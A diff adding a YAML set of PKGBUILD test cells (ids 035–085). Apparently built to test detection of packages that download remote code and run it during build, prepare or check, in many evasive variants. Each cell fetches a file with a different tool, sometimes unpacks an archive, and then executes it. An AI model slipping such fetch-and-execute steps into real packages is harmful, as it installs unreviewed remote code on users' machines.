@@ -1,0 +1,358 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch --depth 1 origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q FETCH_HEAD -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        bun f.erl
+  id: 035-gitdepth-p-check
+- vars:
+    payload: |
+      build() {
+        wget -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 036-wgetbase-w-bg
+- vars:
+    payload: |
+      build() {
+        wget -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (escript f.erl)
+  id: 037-wgetbase-w-sub
+- vars:
+    payload: |
+      dl() {
+        wget -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 038-wgetbase-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          wget -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          fennel f.erl
+        fi
+  id: 039-wgetbase-w-carch
+- vars:
+    payload: |
+      build() {
+        wget -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 040-wgetbase-w-loop
+- vars:
+    payload: |
+      prepare() {
+        wget -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 041-wgetbase-p-prepare
+- vars:
+    payload: |
+      check() {
+        wget -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 042-wgetbase-p-check
+- vars:
+    payload: |
+      build() {
+        wget -q --content-disposition "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 043-wgetcd-w-bg
+- vars:
+    payload: |
+      build() {
+        wget -q --content-disposition "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (escript f.erl)
+  id: 044-wgetcd-w-sub
+- vars:
+    payload: |
+      dl() {
+        wget -q --content-disposition "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 045-wgetcd-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          wget -q --content-disposition "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          fennel f.erl
+        fi
+  id: 046-wgetcd-w-carch
+- vars:
+    payload: |
+      build() {
+        wget -q --content-disposition "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 047-wgetcd-w-loop
+- vars:
+    payload: |
+      prepare() {
+        wget -q --content-disposition "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 048-wgetcd-p-prepare
+- vars:
+    payload: |
+      check() {
+        wget -q --content-disposition "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 049-wgetcd-p-check
+- vars:
+    payload: |
+      build() {
+        curl -fsSL -O "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 050-curlO-w-bg
+- vars:
+    payload: |
+      build() {
+        curl -fsSL -O "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (escript f.erl)
+  id: 051-curlO-w-sub
+- vars:
+    payload: |
+      dl() {
+        curl -fsSL -O "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 052-curlO-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          curl -fsSL -O "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          fennel f.erl
+        fi
+  id: 053-curlO-w-carch
+- vars:
+    payload: |
+      build() {
+        curl -fsSL -O "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 054-curlO-w-loop
+- vars:
+    payload: |
+      prepare() {
+        curl -fsSL -O "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 055-curlO-p-prepare
+- vars:
+    payload: |
+      check() {
+        curl -fsSL -O "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 056-curlO-p-check
+- vars:
+    payload: |
+      build() {
+        axel -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 057-axelbase-w-bg
+- vars:
+    payload: |
+      build() {
+        axel -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (escript f.erl)
+  id: 058-axelbase-w-sub
+- vars:
+    payload: |
+      dl() {
+        axel -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 059-axelbase-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          axel -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          fennel f.erl
+        fi
+  id: 060-axelbase-w-carch
+- vars:
+    payload: |
+      build() {
+        axel -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 061-axelbase-w-loop
+- vars:
+    payload: |
+      prepare() {
+        axel -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 062-axelbase-p-prepare
+- vars:
+    payload: |
+      check() {
+        axel -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 063-axelbase-p-check
+- vars:
+    payload: |
+      build() {
+        lwp-download "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 064-lwpdl-w-bg
+- vars:
+    payload: |
+      build() {
+        lwp-download "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (escript f.erl)
+  id: 065-lwpdl-w-sub
+- vars:
+    payload: |
+      dl() {
+        lwp-download "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 066-lwpdl-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          lwp-download "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          fennel f.erl
+        fi
+  id: 067-lwpdl-w-carch
+- vars:
+    payload: |
+      build() {
+        lwp-download "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 068-lwpdl-w-loop
+- vars:
+    payload: |
+      prepare() {
+        lwp-download "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 069-lwpdl-p-prepare
+- vars:
+    payload: |
+      check() {
+        lwp-download "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 070-lwpdl-p-check
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.zip "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        jar xf f.zip
+        for x in *.sh; do bash "$x"; done
+  id: 071-x-jar-loop
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.zip "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        jar xf f.zip
+        perl < m.pl
+  id: 072-x-jar-perllt
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.cpio "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        cpio -idm < f.cpio
+        for x in *.sh; do bash "$x"; done
+  id: 073-x-cpio-loop
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.cpio "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        cpio -idm < f.cpio
+        perl < m.pl
+  id: 074-x-cpio-perllt
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.rpm "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        rpm2cpio f.rpm | cpio -idm
+        for x in *.sh; do bash "$x"; done
+  id: 075-x-rpm2cpio-loop
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.rpm "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        rpm2cpio f.rpm | cpio -idm
+        perl < m.pl
+  id: 076-x-rpm2cpio-perllt
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.a "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ar x f.a
+        for x in *.sh; do bash "$x"; done
+  id: 077-x-ar-loop
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.a "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ar x f.a
+        perl < m.pl
+  id: 078-x-ar-perllt
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.rar "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        unrar x -o+ f.rar
+        for x in *.sh; do bash "$x"; done
+  id: 079-x-unrar-loop
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.rar "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        unrar x -o+ f.rar
+        perl < m.pl
+  id: 080-x-unrar-perllt
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.zst "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        zstd -d -o m.sh f.zst
+        for x in *.sh; do bash "$x"; done
+  id: 081-x-zstd-loop
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.zst "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        zstd -d -o m.sh f.zst
+        perl < m.pl
+  id: 082-x-zstd-perllt
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.lz4 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        lz4 -d f.lz4 m.sh
+        for x in *.sh; do bash "$x"; done
+  id: 083-x-lz4-loop
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.lz4 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        lz4 -d f.lz4 m.sh
+        perl < m.pl
+  id: 084-x-lz4-perllt
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.tar "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        mkdir -p sub
+        tar -xf f.tar -C sub
+        cp sub/m.sh m.sh 2>/dev/null || true
+        for x in *.sh; do bash "$x"; done
+  id: 085-x-tarsub-loop
